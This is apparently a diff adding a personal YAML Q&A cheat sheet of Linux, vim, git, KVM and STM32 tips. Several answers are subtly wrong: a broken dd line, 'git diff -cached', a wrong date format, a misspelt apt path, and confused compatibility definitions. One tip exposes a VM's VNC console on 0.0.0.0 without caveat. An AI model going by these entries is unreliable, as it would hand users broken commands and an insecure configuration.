+  ans: |
+   - Edit the domain file of the virtual machine, modify 127.0.0.1 to 0.0.0.0, like that, 
+    <graphics type='vnc' port='-1' autoport='yes' listen='0.0.0.0'>
+    <listen type='address' address='0.0.0.0'/>
+    </graphics>
+
+- que:
+  - kvm how to clone
+  - how to clone kvm image
+  ans:
+  - virt-clone -o {old_kvm_name} -n {new_kvm_name} -f {new_kvm_image_address}
+
+- que:
+  - how to change terminal language
+  - how to modify terminal language
+  ans: |
+   - Edit /etc/default/locale, 
+    LANG="en_US.UTF-8"
+    LANGUAGE="en_US:en"
+   - Reboot.
+
+- que:
+  - vim how to paste
+  ans: |
+   - :set paste
+   - :set nopaste
+
+- que:
+  - php can not write files
+  ans:
+  - chmod
+
+- que:
+  - how to transfer files through ssh
+  - how to transfer files by cifs
+  ans:
+  - sudo mount -t cifs //ip_address/folder -o username=xxx,password='xxx',iocharset=utf8 ~/folder
+
+- que:
+  - git how to check the difference
+  - git how to diff
+  ans: |
+   - git diff (tree vs index)
+   - git diff -cached (index vs commit)
+   - git diff HEAD (tree vs commit)
+
+- que:
+  - python how to install tkinter
+  ans:
+  - sudo apt install python3-tk
+
+- que:
+  - ubuntu how to make system disk
+  - linux how to make system disk
+  ans:
+  - sudo dd if=system.iso, of=/dev/sdc
+
+- que:
+  - centos can not connect to network
+  ans: |
+   - vi /etc/sysconfig/network-scripts/ifcfg-eth0
+   - /etc/init.d/network restart
+
+- que:
+  - vim how to edit multiple files
+  ans: |
+   - :args *.txt
+   - :argdo %s/old/new/g | update
+
+- que:
+  - how to unbind ip
+  - how to delete ip
+  ans:
+  - ip addr del <ip> dev eth0
+
+- que:
+  - how to run program on background
+  - how to run command on background
+  ans:
+  - nohup <command> &
+
+- que:
+  - how to show the dos break
+  - how to display the dos break
+  ans:
+  - :e ++ff=unix %
+
+- que:
+  - how to create requirements.txt
+  ans:
+  - pip freeze
+
+- que:
+  - how to solve coding problem of python3
+  ans:
+  - Str = Str.encode('unicode-escape').decode()
+
+- que:
+  - what is forward compatibility and backward compatibility
+  - what is the differents between forward compatibility and backward compatibility
+  ans: |
+   - Forward compatibility means forward version support current version, based on forward version.
+   - Backward compatibility means current version support forward version, based on current version.
+
+- que:
+  - how to make code easy to read
+  - how to read code better
+  ans:
+  - Just make it like nature language.
+
+- que:
+  - how to quick develop
+  - how to develop software fast
+  ans: |
+   - prepare a lot of modules, can help the conceptual product development become more quickly
+   - a lot of equivalent alternative conditions can help locating and fixing the faults
+   - rapid prototype development: I think focing on the special stage function and the speed is very important
+   - rapid prototype development: do before speak!
+   - do not keep coding for a long time, it will finally become very low effective. leave the computer for enough time will make it much better
+   - without communication, without quick development
+
+- que:
+  - can not access windows installer server
+  ans:
+  - Open terminal, enter "msiexec /unregisteru", then enter "msiexec /regserver".
+
+- que:
+  - how to cheat in half life
+  ans: |
+   - sv_cheat 1
+   - god (God mode), impulse 101 (All weapons)
+
+- que:
+  - can not printf on stm32 mdk
+  ans:
+  - Target -> Use MicroLIB must be selected.
+
+- que:
+  - how to build stm32 project
+  - how to build a stm32 project
+  - how to build stm32 mdk project
+  ans: |
+   - 1. Create 5 folders for the code files, 
+     - Libraries (CMSIS STM32F10x_StdPeriph_Driver)
+     - List (listing files)
+     - Obj (output files)
+     - Project (* .uvproj files)
+     - User (main.c)
+   - 2. Open the MDK, create 4 groups, 
+     - Startup (startup files)
+     - CMSIS (core_cm3.c, system_stm32f2xx.c)
+     - User (main.c)
+     - StdPeriph_Driver (stm32f2xx_gpio.c, stm32f2xx_rcc.c, and so on)
+   - 3. Options for Target, 
+     - Output
+     - Listing
+     - C/C++ -> Include Paths (to include the header file path); Define (add USE_STDPERIPH_DRIVER, STM32F2XX_CL)
+
+- que:
+  - how to install gstc-isp on ubuntu
+  ans: |
+   - When I run ./configure, there're some errors, so I did, 
+   - sudo apt-get install gnome-core-devel
+   - sudo apt-get install gawk
+   - When make, there are errors, too. So I did, 
+   - sudo apt-get install libvte-dev
+   - Then edit src/main.c, alter the line to _#include <vte-0.0/vte/vte.h>_
+
+- que:
+  - what is the meaning of flex
+  ans:
+  - A lower power and upgraded timer or bus.
+
+- que:
+  - dxp how to automatically check the pcb layout error
+  ans:
+  - reports -> board information -> report
+
+- que:
+  - what is dummy
+  - what is the meaning of dummy
+  ans:
+  - It means virtual, null pointer.
+
+- que:
+  - where to put the switch
+  ans:
+  - Put in the positive pole, not GND, or the MCU will reboot again and again.
+
+- que:
+  - ls can not work
+  ans:
+  - Make sure the folder have "x" authority.
+
+- que:
+  - which folders need backup
+  - which dirs need backup
+  ans: |
+   - /boot
+   - /etc
+   - /home
+   - /root
+   - /usr/local
+   - /opt
+   - /srv
+   - /var
+
+- que:
+  - which folders do not need backup
+  - which dirs do not need backup
+  ans: |
+   - /dev
+   - /proc
+   - /mnt
+   - /media
+   - /tmp
+
+- que:
+  - how to copy with attributes
+  ans:
+  - cp -a
+
+- que:
+  - how to scp
+  ans:
+  - scp local_file root@xx.xx.xx.xx:remote_folder
+
+- que:
+  - what is pam
+  ans: |
+   - modules for linux security
+   - auth: pam_securetty.so -> /etc/securetty -> pam_env.so -> pam_unix.so -> pam_secceed_if.so -> if not, pam_deny.so
+   - account: pam_nologin.so -> /etc/nologin -> pam_unix.so -> pam_succeed_if.so -> if ok, pam_permit.so
+   - password: pam_cracklib.so -> pam_unix.so -> md5, shadow -> if not, pam_deny.so
+   - session: close pam_selinux.so -> pam_limits.so -> pam_loginuid.so -> open pam_selinux.so
+
+- que:
+  - how to create account
+  ans: |
+   - vi /etc/group
+   - grpconv
+   - vi /etc/passwd
+   - pwconv
+   - passwd user
+   - cp -a /etc/skel /home/user
+   - chown -R usergroup /home/user
+
+- que:
+  - how to distribute disk
+  ans:
+  - use Quota or LVM
+
+- que:
+  - how to mount
+  ans:
+  - sudo mount dev folder
+
+- que:
+  - linux kernel function
+  ans: |
+   - System call interface
+   - Process control
+   - Memory management
+   - File System management
+   - Device drivers
+
+- que:
+  - how to make empty file
+  - how to dd
+  ans:
+  - dd if=/dev/zero of=xxx bs=100M count=1
+
+- que:
+  - python simple http server
+  ans:
+  - python -m SimpleHTTPServer 80
+
+- que:
+  - how to reset time
+  ans:
+  - date +"%Y%m%d %H%m" --set="20170101 1830"
+
+- que:
+  - how to kill user
+  ans:
+  - pkill -kill -t pts/x
+
+- que:
+  - how to rm every file
+  - how to rm all the files
+  ans:
+  - find . -name "xxx" | xargs rm -f
+
+- que:
+  - how to release port
+  ans: |
+   - lsof -i :8000
+   - kill -9 xxx
+
+- que:
+  - how to update pip
+  ans:
+  -  pip install -U pip
+
+- que:
+  - how to mount ntfs
+  ans:
+  -  sudo mount -t ntfs /dev/sda1 /mnt
+
+- que:
+  - how to modify apt source
+  ans:
+  -  sudo vi /etc/apt/source.list
+
+- que:
+  - how to get memory status
+  - how to get ram status
+  ans:
+  -  free -h
+
+- que:
+  - how to check ubuntu version
+  ans:
+  -  lsb_release -a
+
+- que:
+  - how to combine files
+  ans:
+  - cat file1 file2 > file
+
+- que:
+  - how to split file
+  ans:
+  - split -b 10k filename
+
+- que:
+  - how to rename multiple files
+  ans:
+  - rename 's/old/new/g' *.txt
+
+- que:
+  - vim how to open multiple files
+  ans:
+  - vi -o file1, file2, file3
